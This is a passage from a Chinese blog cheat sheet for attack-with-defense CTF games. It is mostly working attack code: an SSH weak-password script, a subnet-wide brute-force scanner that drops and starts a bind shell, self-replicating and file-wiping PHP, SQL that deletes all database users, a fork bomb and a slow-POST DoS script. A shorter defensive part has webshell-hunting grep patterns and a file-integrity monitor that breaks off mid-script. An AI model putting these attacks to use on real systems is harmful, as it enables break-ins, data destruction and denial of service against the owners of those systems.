id="SSH弱密码利用"><a href="#SSH弱密码利用" class="headerlink" title="SSH弱密码利用"></a>SSH弱密码利用</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">#-*- coding:utf-8 -*-</span><br><span class="line">import paramiko</span><br><span class="line">ip = &#x27;192.168.1.137&#x27;</span><br><span class="line">port = &#x27;22&#x27;</span><br><span class="line">username = &#x27;root&#x27;</span><br><span class="line">passwd = &#x27;123456&#x27;</span><br><span class="line"># ssh 用户名 密码 登陆</span><br><span class="line">def ssh_base_pwd(ip,port,username,passwd,cmd=&#x27;cat /flag&#x27;):</span><br><span class="line">    port = int(port)</span><br><span class="line">    ssh = paramiko.SSHClient()</span><br><span class="line">    ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())</span><br><span class="line">    ssh.connect(hostname=ip, port=port, username=username, password=passwd)</span><br><span class="line">    stdin,stdout,stderr = ssh.exec_command(cmd)</span><br><span class="line">    result = stdout.read()</span><br><span class="line">    if not result :</span><br><span class="line">        print(&quot;无结果!&quot;)</span><br><span class="line">        result = stderr.read()</span><br><span class="line">    ssh.close()</span><br><span class="line">    return result.decode()</span><br><span class="line">a = ssh_base_pwd(ip,port,username,passwd)</span><br><span class="line">print(a)</span><br><span class="line"></span><br><span class="line">#SL&#123;3c7c719b9fb980dca71080b9d96c9c6aa03c16c0&#125;</span><br></pre></td></tr></table></figure><p>批量</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br></pre></td><td class="code"><pre><span class="line">#-*- coding:utf-8 -*-</span><br><span class="line">import paramiko</span><br><span class="line">import threading</span><br><span class="line">import queue</span><br><span class="line">import time</span><br><span class="line">#反弹shell python</span><br><span class="line">q=queue.Queue()</span><br><span class="line">#lock = threading.Lock()</span><br><span class="line"></span><br><span class="line"># ssh 用户名 密码 登陆</span><br><span class="line">def ssh_base_pwd(ip,port,username,passwd,cmd):</span><br><span class="line">    port = int(port)</span><br><span class="line">    ssh = paramiko.SSHClient()</span><br><span class="line">    ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())</span><br><span class="line">    ssh.connect(hostname=ip, port=port, username=username, password=passwd)</span><br><span class="line">    stdin,stdout,stderr = ssh.exec_command(cmd)</span><br><span class="line">    result = stdout.read()</span><br><span class="line">    if not result :</span><br><span class="line">        result = stderr.read()</span><br><span class="line">    ssh.close()</span><br><span class="line">    return result.decode()</span><br><span class="line"></span><br><span class="line">def main(x):</span><br><span class="line">    shell = &#x27;&#x27;&#x27;</span><br><span class="line">    #服务器端</span><br><span class="line">    import socket</span><br><span class="line">    import os</span><br><span class="line">    s=socket.socket()   #创建套接字 #s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)</span><br><span class="line">    s.bind((&#x27;0.0.0.0&#x27;,1234))    #绑定地址和端口#0.0.0.0接收任意客户端ip连接</span><br><span class="line">    s.listen(5)                 #调用listen方法开始监听端口，传入的参数为等待连接的最大数量</span><br><span class="line">    con,addr=s.accept()     #接受一个客户端的连接</span><br><span class="line">    #print(con,addr)</span><br><span class="line">    for i in range(10):</span><br><span class="line">        cmd=con.recv(1024)</span><br><span class="line">        print(cmd)</span><br><span class="line">        command=cmd.decode()</span><br><span class="line">        if command.startswith(&#x27;cd&#x27;):</span><br><span class="line">            os.chdir(command[2:].strip())   #切换路径</span><br><span class="line">            result=os.getcwd()      #显示路径</span><br><span class="line">        else:</span><br><span class="line">            result=os.popen(command).read()</span><br><span class="line">        if result:</span><br><span class="line">            con.send(result.encode())</span><br><span class="line">        else:</span><br><span class="line">            con.send(b&#x27;OK!&#x27;)</span><br><span class="line">    &#x27;&#x27;&#x27;</span><br><span class="line">    cmd = &#x27;echo \\&quot;%s\\&quot; &gt; ./shell.py&#x27; % (shell) +&#x27;&amp;&amp; python3 ./shell.py&#x27;</span><br><span class="line">    port = &#x27;22&#x27;</span><br><span class="line">    username = &#x27;root&#x27;</span><br><span class="line">    passwd = &#x27;toor&#x27;</span><br><span class="line"></span><br><span class="line">    ip = &#x27;192.168.1.&#123;&#125;&#x27;.format(x)</span><br><span class="line">    q.put(ip.strip(),block=True, timeout=None)</span><br><span class="line">    ip_demo=q.get()</span><br><span class="line">    #判断是否成功</span><br><span class="line">    try:</span><br><span class="line">        #lock.acquire()</span><br><span class="line">        res = ssh_base_pwd(ip_demo,port,username,passwd,cmd=&#x27;id&#x27;)</span><br><span class="line">        if res:</span><br><span class="line">            print(&quot;[ + ]Ip: %s&quot; % ip_demo +&quot; is success!!! [ + ]&quot;)</span><br><span class="line">            #lock.release()</span><br><span class="line">            ssh_base_pwd(ip_demo,port,username,passwd,cmd)</span><br><span class="line">    except:</span><br><span class="line">        print(&quot;[ - ]Ip: %s&quot; % ip_demo +&quot; is Failed&quot;)</span><br><span class="line">    if x &gt; 255:</span><br><span class="line">        print(&quot;Finshed!!!!!!!!&quot;)</span><br><span class="line">    q.task_done()</span><br><span class="line"></span><br><span class="line">#线程队列部分</span><br><span class="line">th=[]</span><br><span class="line">th_num=255</span><br><span class="line">for x in range(th_num):</span><br><span class="line">        t=threading.Thread(target=main,args=(x,))</span><br><span class="line">        th.append(t)</span><br><span class="line">for x in range(th_num):</span><br><span class="line">        th[x].start()</span><br><span class="line">for x in range(th_num):</span><br><span class="line">        th[x].join()</span><br><span class="line"></span><br><span class="line">#q.join()所有任务完成</span><br></pre></td></tr></table></figure><h2 id><a href="#" class="headerlink" title></a></h2><h2 id="攻击搅屎"><a href="#攻击搅屎" class="headerlink" title="攻击搅屎"></a>攻击搅屎</h2><p>无限复制</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">  set_time_limit(0);</span><br><span class="line">  ignore_user_abort(true);</span><br><span class="line">  while(1)&#123;</span><br><span class="line">      file_put_contents(randstr().&#x27;.php&#x27;,file_get_content(__FILE__));</span><br><span class="line">      file_get_contents(&quot;&lt;http://127.0.0.1/&gt;&quot;);</span><br><span class="line">  &#125;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><p>修改数据库密码</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">update mysql.user set authentication_string=PASSWORD(&#x27;p4rr0t&#x27;);# 修改所有用户密码</span><br><span class="line">flush privileges;</span><br><span class="line">UPDATE mysql.user SET User=&#x27;aaaaaaaaaaaa&#x27; WHERE user=&#x27;root&#x27;;</span><br><span class="line">flush privileges;</span><br><span class="line">delete from mysql.user ;#删除所有用户</span><br><span class="line">flush privileges;</span><br></pre></td></tr></table></figure><p>重启 apache2 和 nigix</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">#!/usr/bin/env sh</span><br><span class="line">while [[ 1 ]]</span><br><span class="line">do</span><br><span class="line">    service apache2 stop</span><br><span class="line">    service nginx stop</span><br><span class="line">done &amp;</span><br></pre></td></tr></table></figure><p>循环删除</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">    set_time_limit(0);</span><br><span class="line">    ignore_user_abort(1);</span><br><span class="line">    unlink(__FILE__);</span><br><span class="line">    function getfiles($path)&#123;</span><br><span class="line">        foreach(glob($path) as $afile)&#123;</span><br><span class="line">            if(is_dir($afile))</span><br><span class="line">                getfiles($afile.&#x27;/*.php&#x27;);</span><br><span class="line">            else</span><br><span class="line">                @file_put_contents($afile,&quot;#Anything#&quot;);</span><br><span class="line">                //unlink($afile);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    while(1)&#123;</span><br><span class="line">        getfiles(__DIR__);</span><br><span class="line">        sleep(10);</span><br><span class="line">    &#125;</span><br><span class="line">?&gt;</span><br><span class="line"></span><br><span class="line">&lt;?php</span><br><span class="line">    set_time_limit(0);</span><br><span class="line">    ignore_user_abort(1);</span><br><span class="line">    array_map(&#x27;unlink&#x27;, glob(&quot;some/dir/*.php&quot;));</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><p>删除数据库</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">#!/usr/bin/env python3</span><br><span class="line">  import base64</span><br><span class="line">  def rm_db(db_user,my_db_passwd):</span><br><span class="line">      cmd = &quot;/usr/bin/mysql -h localhost -u%s %s -e &#x27;&quot;%(db_user,my_db_passwd)</span><br><span class="line">      db_name = [&#x27;performance_schema&#x27;,&#x27;mysql&#x27;,&#x27;flag&#x27;]</span><br><span class="line">      for db in db_name:</span><br><span class="line">          cmd += &quot;drop database %s;&quot;%db</span><br><span class="line">      cmd += &quot;&#x27;&quot;</span><br><span class="line">      return cmd</span><br></pre></td></tr></table></figure><p>fork_bomb</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">#!/bin/sh</span><br><span class="line">/bin/echo &#x27;.() &#123; .|.&amp; &#125; &amp;&amp; .&#x27; &gt; /tmp/aaa;/bin/bash /tmp/aaa;</span><br></pre></td></tr></table></figure><p>DOS脚本（非必要最好不要用）</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line">import socket</span><br><span class="line">import time</span><br><span class="line">import threading</span><br><span class="line"></span><br><span class="line">max=90000000</span><br><span class="line">port=80                 #端口</span><br><span class="line">host=&quot;192.168.92.154&quot;   #IP</span><br><span class="line">page=&quot;/index.php&quot;</span><br><span class="line"></span><br><span class="line">bag=(&quot;POST %s HTTP/1.1\\r\\n&quot;</span><br><span class="line">    &quot;host: %s\\r\\n&quot;</span><br><span class="line">    &quot;Content-Length: 1000000000\\r\\n&quot;</span><br><span class="line">    &quot;Cookie: 1998\\r\\n&quot;</span><br><span class="line">    &quot;\\r\\n&quot; % (page,host))</span><br><span class="line"></span><br><span class="line">socks = []</span><br><span class="line"></span><br><span class="line">def connect():</span><br><span class="line">    global socks</span><br><span class="line">    for i in range(0,max):</span><br><span class="line">        s = socket.socket(socket.AF_INET,socket.SOCK_STREAM)</span><br><span class="line">        try:</span><br><span class="line">            s.connect((host,port))</span><br><span class="line">            s.send(bag.encode(&quot;utf-8&quot;))</span><br><span class="line">            socks.append(s)</span><br><span class="line">        except Exception as ex:</span><br><span class="line">            time.sleep(1)</span><br><span class="line"></span><br><span class="line">def send():</span><br><span class="line">    global socks</span><br><span class="line">    while True:</span><br><span class="line">        for s in socks:</span><br><span class="line">            try:</span><br><span class="line">                print(&quot;攻击中....&quot;)</span><br><span class="line">            except Exception as ex:</span><br><span class="line">                socks.remove(s)</span><br><span class="line">                s.close()</span><br><span class="line">        time.sleep(0.1)</span><br><span class="line"></span><br><span class="line">One = threading.Thread(target=connect,args=())</span><br><span class="line">Two = threading.Thread(target=send,args=())</span><br><span class="line">One.start()</span><br><span class="line">Two.start()</span><br></pre></td></tr></table></figure><h1 id="防守思路"><a href="#防守思路" class="headerlink" title="防守思路"></a>防守思路</h1><h2 id="基础查杀"><a href="#基础查杀" class="headerlink" title="基础查杀"></a>基础查杀</h2><p>寻找最近20分钟修改过的文件</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">find /var/www/html -name *.php -mmin -20</span><br></pre></td></tr></table></figure><p>寻找行数最短的文件：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">find ./ -name &#x27;*.php&#x27; | xargs wc -l | sort -u</span><br></pre></td></tr></table></figure><p>关键字查杀</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">find . -name &#x27;*.php&#x27; | xargs grep -n &#x27;eval(&#x27;</span><br><span class="line">find . -name &#x27;*.php&#x27; | xargs grep -n &#x27;assert&#x27;</span><br><span class="line">find . -name &#x27;*.php&#x27; | xargs grep -n &#x27;system()&#x27;</span><br></pre></td></tr></table></figure><p>查找命令执行函数</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">find /var/www/html -name &quot;*.php&quot; |xargs egrep &#x27;assert|eval|phpinfo\\(\\)|\\(base64_decoolcode|shell_exec|passthru|file_put_contents\\(\\.\\*\\$|base64_decode\\(&#x27;</span><br></pre></td></tr></table></figure><h2 id="文件监控"><a href="#文件监控" class="headerlink" title="文件监控"></a>文件监控</h2><p>脚本</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br></pre></td><td class="code"><pre><span class="line"># -*- coding: utf-8 -*-</span><br><span class="line">#use: python file_check.py ./</span><br><span class="line"></span><br><span class="line">import os</span><br><span class="line">import hashlib</span><br><span class="line">import shutil</span><br><span class="line">import ntpath</span><br><span class="line">import time</span><br><span class="line"></span><br><span class="line">CWD = os.getcwd()</span><br><span class="line">FILE_MD5_DICT = &#123;&#125;      # 文件MD5字典</span><br><span class="line">ORIGIN_FILE_LIST = []</span><br><span class="line"></span><br><span class="line"># 特殊文件路径字符串</span><br><span class="line">Special_path_str = &#x27;drops_JWI96TY7ZKNMQPDRUOSG0FLH41A3C5EXVB82&#x27;</span><br><span class="line">bakstring = &#x27;bak_EAR1IBM0JT9HZ75WU4Y3Q8KLPCX26NDFOGVS&#x27;</span><br><span class="line">logstring = &#x27;log_WMY4RVTLAJFB28960SC3KZX7EUP1IHOQN5GD&#x27;</span><br><span class="line">webshellstring = &#x27;webshell_WMY4RVTLAJFB28960SC3KZX7EUP1IHOQN5GD&#x27;</span><br><span class="line">difffile = &#x27;diff_UMTGPJO17F82K35Z0LEDA6QB9WH4IYRXVSCN&#x27;</span><br><span class="line"></span><br><span class="line">Special_string = &#x27;drops_log&#x27;  # 免死金牌</span><br><span class="line">UNICODE_ENCODING = &quot;utf-8&quot;</span><br><span class="line">INVALID_UNICODE_CHAR_FORMAT = r&quot;\\?%02x&quot;</span><br><span class="line"></span><br><span class="line"># 文件路径字典</span><br><span class="line">spec_base_path = os.path.realpath(os.path.join(CWD, Special_path_str))</span><br><span class="line">Special_path = &#123;</span><br><span class="line">    &#x27;bak&#x27; : os.path.realpath(os.path.join(spec_base_path, bakstring)),</span><br><span class="line">    &#x27;log&#x27; : os.path.realpath(os.path.join(spec_base_path, logstring)),</span><br><span class="line">    &#x27;webshell&#x27; : os.path.realpath(os.path.join(spec_base_path, webshellstring)),</span><br><span class="line">    &#x27;difffile&#x27; : os.path.realpath(os.path.join(spec_base_path, difffile)),</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">def isListLike(value):</span><br><span class="line">    return isinstance(value, (list, tuple, set))</span><br><span class="line"></span><br><span class="line"># 获取Unicode编码</span><br><span class="line">def getUnicode(value, encoding=None, noneToNull=False):</span><br><span class="line"></span><br><span class="line">    if noneToNull and value is None:</span><br><span class="line">        return NULL</span><br><span class="line"></span><br><span class="line">    if isListLike(value):</span><br><span class="line">        value = list(getUnicode(_, encoding, noneToNull) for _ in value)</span><br><span class="line">        return value</span><br><span class="line"></span><br><span class="line">    if isinstance(value, unicode):</span><br><span class="line">        return value</span><br><span class="line">    elif isinstance(value, basestring):</span><br><span class="line">        while True:</span><br><span class="line">            try:</span><br><span class="line">                return unicode(value, encoding or UNICODE_ENCODING)</span><br><span class="line">            except UnicodeDecodeError, ex:</span><br><span class="line">                try:</span><br><span class="line">                    return unicode(value, UNICODE_ENCODING)</span><br><span class="line">                except:</span><br><span class="line">                    value = value[:ex.start] + &quot;&quot;.join(INVALID_UNICODE_CHAR_FORMAT % ord(_) for _ in value[ex.start:ex.end]) + value[ex.end:]</span><br><span class="line">    else:</span><br><span class="line">        try:</span><br><span class="line">            return unicode(value)</span><br><span class="line">        except UnicodeDecodeError:</span><br><span class="line">            return unicode(str(value), errors=&quot;ignore&quot;)</span><br><span class="line"></span><br><span class="line"># 目录创建</span><br><span class="line">def mkdir_p(path):</span><br><span class="line">    import errno</span><br><span class="line">    try:</span><br><span class="line">        os.makedirs(path)</span><br><span class="line">    except OSError as exc:</span><br><span class="line">        if exc.errno == errno.EEXIST and os.path.isdir(path):</span><br><span class="line">            pass</span><br><span class="line">        else: raise</span><br><span class="line"></span><br><span class="line"># 获取当前所有文件路径</span><br><span class="line">def getfilelist(cwd):</span><br><span class="line">    filelist = []</span><br><span class="line">    for root,subdirs, files in os.walk(cwd):</span><br><span class="line">        for filepath in files:</span><br><span class="line">            originalfile = os.path.join(root, filepath)</span><br><span class="line">            if Special_path_str not in originalfile:</span><br><span class="line">                filelist.append(originalfile)</span><br><span class="line">    return filelist</span><br><span class="line"></span><br><span class="line"># 计算机文件MD5值</span><br><span class="line">def calcMD5(filepath):</span><br><span class="line">    try:</span><br><span class="line">        with open(filepath,&#x27;rb&#x27;) as f:</span><br><span class="line">            md5obj = hashlib.md5()</span><br><span class="line">            md5obj.update(f.read())</span><br><span class="line">            hash = md5obj.hexdigest()</span><br><span class="line">            return hash</span><br><span class="line">    except Exception, e:</span><br><span class="line">        print u&#x27;[!] getmd5_error : &#x27; + getUnicode(filepath)</span><br><span class="line">        print getUnicode(e)</span><br><span class="line">        try:</span><br><span class="line">            ORIGIN_FILE_LIST.remove(filepath)</span><br><span class="line">            FILE_MD5_DICT.pop(filepath, None)</span><br><span class="line">        except KeyError, e:</span><br><span class="line">            pass</span><br><span class="line"></span><br><span class="line"># 获取所有文件MD5</span><br><span class="line">def getfilemd5dict(filelist = []):</span><br><span class="line">    filemd5dict = &#123;&#125;</span><br><span class="line">    for ori_file in filelist:</span><br><span class="line">        if Special_path_str not in ori_file:</span><br><span class="line">            md5 = calcMD5(os.path.realpath(ori_file))</span><br><span class="line">            if md5:</span><br><span class="line">                filemd5dict[ori_file] = md5</span><br><span class="line">    return filemd5dict</span><br><span class="line"></span><br><span class="line"># 备份所有文件</span><br><span class="line">def backup_file(filelist=[]):</span><br><span class="line">    # if len(os.listdir(Special_path[&#x27;bak&#x27;])) == 0:</span><br><span class="line">    for filepath in filelist:</span><br><span class="line">        if Special_path_str not in filepath:</span><br><span class="line">            shutil.copy2(filepath, Special_path[&#x27;bak&#x27;])</span><br><span class="line"></span><br><span class="line">if __name__ == &#x27;__main__&#x27;:</span><br><span class="line">    print u&#x27;---------start------------&#x27;</span><br><span class="line">    for value in Special_path:</span><br><span class="line">        mkdir_p(Special_path[value])</span><br><span class="line">    # 获取所有文件路径，并获取所有文件的MD5，同时备份所有文件</span><br><span class="line">    ORIGIN_FILE_LIST = getfilelist(CWD)</span><br><span class="line">    FILE_MD5_DICT = getfilemd5dict(ORIGIN_FILE_LIST)</span><br><span class="line">    backup_file(ORIGIN_FILE_LIST) # TODO 备份文件可能会产生重名BUG</span><br><span class="line">    print u&#x27;[*] pre work end!&#x27;</span><br><span class="line">    while True:</span><br><span class="line">        file_list = getfilelist(CWD)</span><br><span class="line">        # 移除新上传文件</span><br><span class="line">        diff_file_list = list(set(file_list) ^ set(ORIGIN_FILE_LIST))</span><br><span class="line">        if len(diff_file_list) != 0:</span><br><span class="line">            # import pdb;pdb.set_trace()</span><br><span class="line">            for filepath in diff_file_list:</span><br><span class="line">                try:</span><br><span class="line">                    f = open(filepath, &#x27;r&#x27;).read()</span><br><span class="line">                except Exception, e:</span><br><span class="line">                    break</span><br><span class="line">                if Special_string not in f:</span><br><span class="line">                    try:</span><br><span class="line">                        print u&#x27;[*] webshell find : &#x27; + getUnicode(filepath)</span><br><span class="line">                        shutil.move(filepath, os.path.join(Special_path[&#x27;webshell&#x27;], ntpath.basename(filepath) + &#x27;.txt&#x27;))</span><br><span class="line">                    except Exception as e:</span><br><span class="line">                        print u&#x27;[!] move webshell error, &quot;%s&quot; maybe is webshell.&#x27;%getUnicode(filepath)</span><br><span class="line">                    try:</span><br><span class="line">                        f = open(os.path.join(Special_path[&#x27;log&#x27;], &#x27;log.txt&#x27;), &#x27;a&#x27;)</span><br><span class="line">                        f.write(&#x27;newfile: &#x27; + getUnicode(filepath) + &#x27; : &#x27; + str(time.ctime()) + &#x27;\\n&#x27;)</span><br><span class="line">                        f.close()</span><br><span class="line">                    except Exception as e:</span><br><span class="line">                        print u&#x27;[-] log error : file move error: &#x27; + getUnicode(e)</span><br><span class="line"></span><br><span class="line">        # 防止任意文件被修改,还原被修改文件</span><br><span class="line">        md5_dict = getfilemd5dict(ORIGIN_FILE_LIST)</span><br><span class="line">        for filekey in md5_dict:</span><br><span class="line">            if md5_dict[filekey] != FILE_MD5_DICT[filekey]:</span><br><span class="line">                try:</span><br><span class="line">                    f = open(filekey, &#x27;r&#x27;).read()</span><br><span class="line">                except Exception, e:</span><br><span class="line">                    break</span><br><span class="line">                if Special_string not in f:</span><br><span class="line">                    try:</span><br><span class="line">                        print u&#x27;[*] file had be change : &#x27; + getUnicode(filekey)</span><br><span class="line">                        shutil.move(filekey, os.path.join(Special_path[&#x27;difffile&#x27;], ntpath.basename(filekey) + &#x27;.txt&#x27;))</span><br><span class="line">                        shutil.move(os.path.join(Special_path[&#x27;bak&#x27;], ntpath.basename(filekey)), filekey)</span><br><span class="line">                    except Exception as e:</span><br><span class="line">                        print u&#x27;[!] move webshell error, &quot;%s&quot; maybe is webshell.&#x27;%getUnicode(filekey)</span><br><span class="line">                    try:</span><br><span class="line">                        f = open(os.path.join(Special_path[&#x27;log&#x27;], &#x27;log.txt&#x27;), &#x27;a&#x27;)</span><br><span class="line">                        f.write(&#x27;diff_file: &#x27; + getUnicode(filekey) + &#x27; : &#x27; + getUnicode(time.ctime()) + 